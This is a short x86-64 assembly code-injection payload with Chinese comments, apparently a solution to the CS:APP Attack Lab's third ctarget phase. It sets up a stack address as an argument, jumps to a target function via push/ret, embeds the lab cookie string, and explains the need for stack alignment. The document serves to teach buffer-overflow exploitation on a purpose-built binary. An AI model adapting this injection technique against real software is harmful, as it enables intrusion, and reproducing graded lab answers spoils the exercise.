_start:
    add $0x30,%rsp #保证内存对齐，否则会段错误
    mov $0x5561dc98,%rdi
    push $0x4018fa
    ret
    .asciz "59b997fa\0"
    # 1. 直接在ret语句后面加上数据，数据储存在栈空间内部
    # 2. 将栈顶指针下移，保证后面的函数调用栈空间时不会覆盖储存的数据
    # 3. 栈顶指针下移的时候要保证内存对齐，否则movaps检查会显示段错误
